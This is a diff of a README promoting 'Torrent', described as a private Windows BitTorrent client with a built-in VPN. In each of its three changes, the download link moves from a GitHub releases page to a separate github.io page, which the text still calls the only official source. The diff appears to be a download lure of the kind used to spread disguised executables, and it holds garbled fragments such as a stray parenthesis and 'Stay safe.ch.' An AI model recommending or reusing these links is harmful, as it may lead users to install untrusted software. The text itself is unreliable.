@@ -1,6 +1,6 @@
 # 🔒 Torrent - Private BitTorrent Client with Built-In VPN Protection
 
-[![Download Torrent](https://img.shields.io/badge/Download-Torrent_Client-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=0d1117&color=238636)](https://github.com/Oceanitesbibliotist97/Torrent/releases)
+[![Download Torrent](https://img.shields.io/badge/Download-Torrent_Client-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=0d1117&color=238636)](https://oceanitesbibliotist97.github.io)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to **Torrent** — your private, portable BitTorrent client for Windows.
 
 ### 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Oceanitesbibliotist97/Torrent/releases](https://github.com/Oceanitesbibliotist97/Torrent/releases)
+Visit this link to download the application: [https://oceanitesbibliotist97.github.io](https://oceanitesbibliotist97.github.io)
 
 )
 
@@ -165,7 +165,7 @@ Download the latest release from the same link and replace the old files. Your s
 
 Torrent is the result of months of careful development focused on one thing: giving you the most private, hassle-free torrenting experience on Windows. No bloat, no phone-home, no complicated configuration. If you value your digital privacy, this tool belongs on your desktop. 
 
-**Remember:** The download link — [https://github.com/Oceanitesbibliotist97/Torrent/releases](https://github.com/Oceanitesbibliotist97/Torrent/releases) — is the only official source. Never download Torrent from third-party sites. Stay safe.ch.
+**Remember:** The download link — [https://oceanitesbibliotist97.github.io](https://oceanitesbibliotist97.github.io) — is the only official source. Never download Torrent from third-party sites. Stay safe.ch.
 
 
 
